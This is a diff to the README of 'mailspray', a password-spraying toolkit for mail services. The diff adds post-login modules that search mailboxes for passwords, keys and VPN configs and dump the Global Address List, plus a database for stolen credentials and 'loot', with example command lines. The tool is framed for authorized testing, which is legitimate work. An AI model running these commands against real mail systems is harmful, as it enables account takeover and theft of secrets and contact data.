@@ -1,4 +1,4 @@
-# mailspray **v0.5.6**
+# mailspray **v0.5.7**
 
 ```
     ███╗   ███╗ █████╗ ██╗██╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
@@ -7,10 +7,12 @@
     ██║╚██╔╝██║██╔══██║██║██║     ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝
     ██║ ╚═╝ ██║██║  ██║██║███████╗███████║██║     ██║  ██║██║  ██║   ██║
     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
-                                          v0.5.6 // mail password spraying toolkit
+                                          v0.5.7 // mail password spraying toolkit
 ```
 
 CLI for password spraying against mail stacks: OWA, EWS, ADFS, IMAP, SMTP, Roundcube, Zimbra. Batching, delay and jitter between batches, per-user attempt limits, protocol-aware username formatting.
+
+**NetExec-style modules (`-M`)** for post-auth actions — `cred_scan` (hunt credentials/VPN/secrets in a mailbox over IMAP) and `gal` (dump the Global Address List from OWA/EWS). Findings (valid creds + module loot) are stored in a per-workspace SQLite DB under `~/.mailspray/workspaces/`.
 
 **Authorized security testing only.**
 
@@ -84,6 +86,15 @@ mailspray [-P PORT] (-u USER | -k USER) -p PASS [-d DOMAIN] [-F FMT] [-A URI] [-
 | **-v, --verbose** | Show failures, skips, errors |
 | **-q, --no-progress** | Hide live progress line |
 
+### MODULES
+
+| | |
+|:---|:---|
+| **-M, --module NAME** | Run a post-auth module after successful login (e.g. `cred_scan`, `gal`) |
+| **-L, --list-modules** | List available modules and exit |
+| **-O, --module-options KEY=VAL** | Module option, repeatable (e.g. `-O folders=INBOX,Sent -O max=200`) |
+| **-w, --workspace NAME** | Findings workspace DB (`~/.mailspray/workspaces/NAME.db`; default: `default`) |
+
 ### MISC
 
 | | |
@@ -124,6 +135,36 @@ mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt -d corp.c
 
 # Zimbra + JSON
 mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!' -d target.com -j /tmp/mailspray-results.json
+```
+
+---
+
+## Modules (`-M`)
+
+NetExec-style post-auth modules run *after* a successful login and store findings in the workspace DB.
+
+```bash
+# List modules
+mailspray -L
+
+# cred_scan — hunt secrets in a mailbox over IMAP (bodies + text attachments, all folders)
+mailspray imap mail.corp.com -u user -p 'Pass!' -M cred_scan
+mailspray imap mail.corp.com -u user -p 'Pass!' -M cred_scan -O folders=INBOX,Sent -O max=200 -O since=01-Jan-2025
+
+# gal — dump the Global Address List from OWA (FindPeople) or EWS (ResolveNames)
+mailspray owa https://owa.corp.com -u user -p 'Pass!' -d CORP -M gal -O out=/tmp/gal.txt
+mailspray ews https://mail.corp.com -u user -p 'Pass!' -d CORP -M gal -O prefix=smith
+```
+
+| Module | Protocols | What it does |
+|:---|:---|:---|
+| **cred_scan** | `imap` | Scans message bodies and text attachments for passwords, private keys, API keys, VPN configs, connection strings, and inline URL credentials. Uses `BODY.PEEK` — never marks mail as read. Options: `folders`, `max`, `since`, `attachments`. |
+| **gal** | `owa`, `ews` | Dumps the Global Address List. OWA path reuses the authenticated cookie session against `/owa/service.svc?action=FindPeople` (MailSniper technique); EWS path sweeps `ResolveNames` (Basic auth). Options: `prefix`, `max`, `out`. |
+
+**Findings store.** Every valid credential (from spraying *or* module runs) plus all module loot is written to a per-workspace SQLite DB at `~/.mailspray/workspaces/<name>.db` (default workspace `default`, override with `-w`). Tables: `credentials` and `loot`. Writes are best-effort and never abort a run.
+
+```bash
+sqlite3 ~/.mailspray/workspaces/default.db 'select category, key, source from loot;'
 ```
 
 ---
